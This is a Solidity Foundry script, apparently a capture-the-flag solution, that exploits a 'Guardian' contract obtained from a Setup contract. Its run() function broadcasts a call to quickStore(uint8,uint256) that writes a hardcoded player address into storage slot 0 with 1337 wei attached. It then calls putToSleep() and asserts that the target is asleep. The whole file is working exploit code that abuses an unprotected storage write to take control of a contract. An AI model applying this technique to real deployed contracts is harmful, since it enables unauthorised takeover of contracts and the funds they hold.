// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Importing Forge standard libraries and contract dependencies.
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./src/Guardian.sol";
import "./src/Setup.sol";

/**
 * @title ExploitScript
 * @dev This contract is designed to demonstrate an exploit against the Guardian contract.
 */
contract ExploitScript is Script {
    Setup set;
    address player = 0x03251afe2baA021D563A01fd45cac4C585b9D7b6;
    // Function to set up the exploit environment. Currently, it is an empty placeholder.
    function setUp() public {
        set = new Setup();
    }

    /**
     * @dev Executes the exploit against the Guardian contract.
     *      It involves making a specific call to the contract and then triggering its sleep state.
     */
    function run() public  {
        // Start broadcasting transactions to the network.
        vm.startBroadcast();

        // Retrieve the target Guardian contract address from the setup contract.
        address guardian = address(set.TARGET());

        // Prepare the data for the call to the Guardian contract.
        bytes memory data = abi.encodeWithSignature("quickStore(uint8,uint256)", 0, uint256(uint160(player)));  

        // Call the Guardian contract with specific data and value.
        guardian.call{value: 1337}(data);

        // Put the Guardian contract to sleep.
        Guardian(payable(guardian)).putToSleep();

        // Assert that the Guardian contract is now in a sleep state.
        assert(Guardian(payable(guardian)).asleep() == true);

        // Stop broadcasting transactions.
        vm.stopBroadcast();
    }
}
